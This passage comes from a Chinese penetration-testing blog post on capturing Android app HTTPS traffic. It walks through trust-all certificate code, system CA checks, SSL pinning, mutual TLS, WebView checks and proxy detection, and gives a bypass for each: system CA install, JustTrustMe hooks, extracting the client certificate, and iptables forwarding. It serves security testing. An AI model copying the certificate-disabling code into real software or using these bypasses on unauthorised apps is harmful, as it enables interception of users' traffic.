class="variable">mClient</span> <span class="operator">=</span> client.newBuilder().sslSocketFactory(HttpsTrustAllCerts.createSSLSocketFactory(),<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>.TrustAllHostnameVerifier()).build();</span><br><span class="line"></span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=trustAllCerts&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432001</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;请求成功: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434001</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>HttpsTrustAllCerts</code>对象实对<code>X509TrustManager</code>接口进行了实现，重写<code>checkClientTrusted</code>、<code>checkServerTrusted</code>、<code>verify</code>等方法，使其验证逻辑为空，达到信任所有证书的效果:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpsTrustAllCerts</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class="line">        <span class="comment">//TODO</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class="line">        <span class="comment">//TODO</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>]; <span class="comment">//返回长度为0的数组，相当于return null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory <span class="title function_">createSSLSocketFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SSLSocketFactory</span> <span class="variable">sSLSocketFactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sc</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sc.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()&#125;,<span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            sSLSocketFactory = sc.getSocketFactory();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sSLSocketFactory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAllHostnameVerifier</span> <span class="keyword">implements</span> <span class="title class_">HostnameVerifier</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String s, SSLSession sslSession)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>忽略证书校验的https请求和使用 http协议的请求报文一样，可以直接设置代理抓包。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201325324.png" alt="image.png"> </p><h2 id="2-系统证书校验"><a href="#2-系统证书校验" class="headerlink" title="2. 系统证书校验"></a>2. 系统证书校验</h2><p>在Android7.0之前，默认用户级的证书凭据是被服务端所信任的，但<strong>7.0之后，安卓系统不再信任用户级凭据</strong>。</p><p>OkHttp框架发起https请求时，默认就是使用的系统信任库证书链对服务端返回的证书进行验证，https请求实现如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* https协议</span></span><br><span class="line"><span class="comment">* 默认证书链校验，只信任系统CA(根证书)</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* OKHTTP默认的https请求使用系统CA验证服务端证书（Android7.0以下还信任用户证书，Android7.0开始默认只信任系统证书）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mHttpsConnectButton = findViewById(R.id.httpsConnect);</span><br><span class="line">mHttpsConnectButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=defaultCerts&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432002</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;请求成功: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434002</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>设置系统代理，抓取该数据报文，会发现App报错**<em>java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.*<strong>，抓包工具burp会提示</strong></em>certificate_unknown***，其原因在于burp拦截https流量时，会同时充当客户端和服务端。在面向App时，此时burp充当服务端，https协议握手过程中，burp会将自己的证书发送给App，因为App使用系统信任库里面的证书进行校验，而burp的证书不在系统信任库中，所以导致https握手失败，报错CertPathValidatorException。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201334179.png" alt="image.png"> </p><p>根据上述分析，对抗使用系统证书校验的方式，只需要将抓包工具的证书安装到系统信任库里面即可正常抓包。需要注意的是，在Android 7.0以前，应用默认会信任系统证书和用户证书，Android 7.0开始，默认只信任系统证书，在root环境下，将证书导入系统目录的方法可参考  <a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/">Configuring Burp Suite With Android Nougat</a>   ，将抓包工具的证书添加到手机系统证书以后，设置代理，抓包效果如下:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201334847.png" alt="image.png"> </p><h2 id="3-SSLPinning"><a href="#3-SSLPinning" class="headerlink" title="3. SSLPinning"></a>3. SSLPinning</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232205858.jpeg" alt="img"> </p><p><a href="https://developer.android.com/training/articles/security-config">SSL PINNING</a>是Google官方推荐的校验方式，原理是在客户端中预先设置好证书信息，握手时与服务端返回的证书进行比较，以确保服务端返回的证书的真实性，实现方式有两种，</p><ul><li>一种是在代码层实现</li><li>一种是通过network_security_config.xml配置文件完成。</li></ul><h3 id="代码校验"><a href="#代码校验" class="headerlink" title="代码校验"></a>代码校验</h3><p>以OkHttp网络框架为例，校验证书公钥的示列代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SSL Pinning</span></span><br><span class="line"><span class="comment">* 公钥绑定，验证证书公钥，还可以add验证其他要素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mSSLPinningButton = findViewById(R.id.sslPinning);</span><br><span class="line">mSSLPinningButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">                <span class="comment">//获取目标公钥: openssl s_client -connect www.baidu.com:443 -servername www.baidu.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CA_PUBLIC_KEY</span> <span class="operator">=</span> <span class="string">&quot;sha256//558pd1Y5Vercv1ZoSqOrJWDsh9sTMEolM6T8csLucQ=&quot;</span>;</span><br><span class="line">                <span class="comment">//只校验公钥</span></span><br><span class="line">                <span class="type">CertificatePinner</span> <span class="variable">pinner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.Builder()</span><br><span class="line">                        .add(CA_DOMAIN, CA_PUBLIC_KEY)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">OkHttpClient</span> <span class="variable">pClient</span> <span class="operator">=</span> client.newBuilder().certificatePinner(pinner).build();</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=SSLPinningCode&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> pClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432003</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;请求成功: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434003</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>通过res&#x2F;xml&#x2F;network_security_config.xml配置文件对证书进行校验是官方推荐使用的方法，配置方式可以细分为两种:</p><p>使用<strong>证书校验</strong>和<strong>公钥校验</strong>，具体示列如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--证书校验--&gt;</span><br><span class="line">&lt;domain-config&gt;</span><br><span class="line">    &lt;domain includeSubdomains=<span class="string">&quot;true&quot;</span>&gt;bing.com&lt;/domain&gt;</span><br><span class="line">    &lt;trust-anchors&gt;</span><br><span class="line">        &lt;!--获取证书: openssl s_client -connect bing.com:<span class="number">443</span> -servername bing.com | openssl x509 -out bing.pem--&gt;</span><br><span class="line">        &lt;certificates src=<span class="string">&quot;@raw/bing&quot;</span>/&gt;</span><br><span class="line">    &lt;/trust-anchors&gt;</span><br><span class="line"></span><br><span class="line">&lt;/domain-config&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--公钥校验--&gt;</span><br><span class="line">&lt;domain-config&gt;</span><br><span class="line">    &lt;domain includeSubdomains=<span class="string">&quot;true&quot;</span>&gt;so.com&lt;/domain&gt;</span><br><span class="line">    &lt;!--so.com公钥校验</span><br><span class="line">    获取公钥: openssl s_client -connect so.com:<span class="number">443</span> -servername so.com | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der | openssl dgst -sha256 -binary | openssl enc -base64</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;pin-set expiration=<span class="string">&quot;2099-01-01&quot;</span>&gt;</span><br><span class="line">        &lt;pin digest=<span class="string">&quot;SHA-256&quot;</span>&gt;XCXZ8ud+eneT+di9eIMfC7Z2x+p2cr2KJ3e7TnIEOx4=&lt;/pin&gt;</span><br><span class="line">    &lt;/pin-set&gt;</span><br><span class="line">&lt;/domain-config&gt;</span><br></pre></td></tr></table></figure><p>通过SSL PINNING绑定证书以后，设置系统代理，即使将抓包工具的证书导入到系统目录，抓包时依然会发现App报错javax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure! 或者 javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.，报错的原因是<strong>APP预置的证书信息与服务端返回的证书信息校验不一致，导致握手失败</strong></p><p>绕过SSL PINNING会稍微麻烦一点，需要使用到第三方插件，比如老牌的JustTrustMe模块，其绕过原理是通过Hook各网络框架的证书验证方法，替换其方法原有的逻辑，使校验失效。安装插件以后，设置代理，抓包效果如下:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232208743.png" alt="image.png"> </p><h2 id="4-双向证书校验"><a href="#4-双向证书校验" class="headerlink" title="4. 双向证书校验"></a>4. 双向证书校验</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232209718.jpeg" alt="img"> </p><p>无论是系统证书链校验还是SSL PINNING，其本质都是客户端在校验服务端的证书，即单向校验。如果先保存一个证书在APP客户端中，HTTPS协议握手时客户端把APP中保存的证书发送给服务端，这种客户端校验服务端证书，同时服务端也校验客户端证书的方式称为双向校验。以OkHttp框架为例，示列代码如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 双向校验</span></span><br><span class="line"><span class="comment">* 因该测试是自建服务器并自签名，所以需要先在res/xml/network_security_config中配置信任服务端证书</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mTwoVerificationButton = findViewById(R.id.twoVerification);</span><br><span class="line">mTwoVerificationButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">X509TrustManager</span> <span class="variable">trustManager</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">TrustManagerFactory</span> <span class="variable">trustManagerFactory</span> <span class="operator">=</span> TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</span><br><span class="line"></span><br><span class="line">                    trustManagerFactory.init((KeyStore) <span class="literal">null</span>);</span><br><span class="line">                    TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();</span><br><span class="line">                    <span class="keyword">if</span> (trustManagers.length != <span class="number">1</span> || !(trustManagers[<span class="number">0</span>] <span class="keyword">instanceof</span> X509TrustManager)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected default trust managers:&quot;</span> + Arrays.toString(trustManagers));</span><br><span class="line">                    &#125;</span><br><span class="line">                    trustManager = (X509TrustManager) trustManagers[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">OkHttpClient</span> <span class="variable">mClient</span> <span class="operator">=</span> client.newBuilder().sslSocketFactory(ClientSSLSocketFactory.getSocketFactory(MainActivity.<span class="built_in">this</span>),trustManager).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HostnameVerifier</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span> &#123;</span><br><span class="line">                        <span class="type">HostnameVerifier</span> <span class="variable">hv</span> <span class="operator">=</span> HttpsURLConnection.getDefaultHostnameVerifier();</span><br><span class="line">                        <span class="keyword">return</span> hv.verify(<span class="string">&quot;www.test.com&quot;</span>, session);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).build();</span><br><span class="line"></span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.test.com/?q=doubleVerif&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432005</span>;</span><br><span class="line">                    Log.d(<span class="string">&quot;TestReq&quot;</span>, response.body().string());</span><br><span class="line">                    message.obj = <span class="string">&quot;请求成功: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434005</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>示列中校验的是test.com域名，可以通过绑定hosts的方式在本地进行测试。ClientSSLSocketFactory对象实现如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSSLSocketFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_STORE_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;Curz0n&quot;</span>;<span class="comment">//证书密码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InputStream client_input;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory <span class="title function_">getSocketFactory</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//客户端证书</span></span><br><span class="line">            client_input = context.getResources().getAssets().open(<span class="string">&quot;client.p12&quot;</span>);</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            <span class="type">KeyStore</span> <span class="variable">keyStore</span> <span class="operator">=</span> KeyStore.getInstance(<span class="string">&quot;PKCS12&quot;</span>);</span><br><span class="line">            keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            <span class="type">KeyManagerFactory</span> <span class="variable">keyManagerFactory</span> <span class="operator">=</span> KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            sslContext.init(keyManagerFactory.getKeyManagers(), <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> sslContext.getSocketFactory();</span><br><span class="line">            <span class="keyword">return</span> factory;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                client_input.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端使用Python实现的，代码如下所示:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="comment">#服务端证书和私钥</span></span><br><span class="line">serverCerts = <span class="string">&quot;%s/certs/server/server-cert.cer&quot;</span> % os.getcwd()</span><br><span class="line">serverKey = <span class="string">&quot;%s/certs/server/server-key.key&quot;</span> % os.getcwd()</span><br><span class="line"><span class="comment">#客户端证书</span></span><br><span class="line">clientCerts = <span class="string">&quot;%s/certs/client/client-cert.cer&quot;</span> % os.getcwd()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_writeheaders</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self._writeheaders()</span><br><span class="line">        self.wfile.write(<span class="string">&quot;OK&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        port = <span class="number">443</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        port = sys.argv[<span class="number">1</span>]</span><br><span class="line">    server_address = (<span class="string">&quot;0.0.0.0&quot;</span>, <span class="built_in">int</span>(port))</span><br><span class="line">    server = HTTPServer(server_address, RequestHandler)</span><br><span class="line">    <span class="comment">#双向校验</span></span><br><span class="line">    server.socket = ssl.wrap_socket(server.socket, certfile = serverCerts, server_side = <span class="literal">True</span>,  </span><br><span class="line">                               keyfile = serverKey,</span><br><span class="line">                               cert_reqs = ssl.CERT_REQUIRED,</span><br><span class="line">                               ca_certs = clientCerts</span><br><span class="line">                               )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting server, listen at: %s:%s&quot;</span> % server_address)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>设置系统代理，访问目标抓取报文，发现代理工具burp报错certificate_required</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232211076.png" alt="image.png"> </p><p>我们知道burp能抓包HTTPS协议报文的原理是: burp在中间即充当客户端，又充当服务端。在burp冒充客户端时，因为服务端要求APP发送客户端证书进行验证，而burp没有客户端证书，所以导致握手失败。知道报错的原因，那解决问题就简单了，我们可以通过逆向APP获取到客户端证书和密码，然后将客户端证书导入burp中，这样burp又可以正常冒充客户端身份证了，如下所示，把客户端证书导入到burp中:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232211006.png" alt="image.png"> </p><p>抓包效果如下:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406232212855.png" alt="image.png"> </p><h2 id="5-webview证书校验"><a href="#5-webview证书校验" class="headerlink" title="5. webview证书校验"></a>5. webview证书校验</h2><p>在使用WebView进行HTTPS请求时，同样可以对HTTPS证书进行校验，WebView控件对请求逻辑进行了封装，所以进行证书校验更加方便，具体代码如下所示，handler.cancel()相当于使用系统证书校验:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mWebview.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;</span><br><span class="line">        <span class="comment">//忽略证书校验</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;trustAllCerts&quot;</span>.equals(tag))&#123;</span><br><span class="line">            handler.proceed();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            handler.cancel();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果想SSL PINING，同样可以通过res&#x2F;xml&#x2F;network_security_config.xml配置文件对服务端证书进行校验。对抗证书校验的方法和OkHttp网络框架一样，具体参考上文，除了双向校验以外，抓包截图中都有WebView的请求报文。</p><h2 id="6-代理检测"><a href="#6-代理检测" class="headerlink" title="6. 代理检测"></a>6. 代理检测</h2><p>除了校验HTTPS证书防止中间人抓包以外，常见的方法还有通过检测代理防止抓包，其原理是检测到设备开启系统代理后，APP中通过代码实现禁用代理，以OkHttp框架为例，示列代码如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 检测代理</span></span><br><span class="line"><span class="comment">* 直接绕过代理，网络正常但抓包工具无法抓包</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mCheckProxy = findViewById(R.id.checkProxy);</span><br><span class="line">mCheckProxy.setOnCheckedChangeListener(<span class="keyword">new</span> <span class="title class_">CompoundButton</span>.OnCheckedChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCheckedChanged</span><span class="params">(CompoundButton buttonView, <span class="type">boolean</span> isChecked)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isChecked)&#123;</span><br><span class="line">            client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().proxy(Proxy.NO_PROXY).build();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            client = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对抗方法也比较简单，可以使用iptables对请求进行强制转发，ProxyDroid全局代理工具就是通过iptables实现的，所以使用ProxyDroid开启代理，可以比较有效的绕过代理检测。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
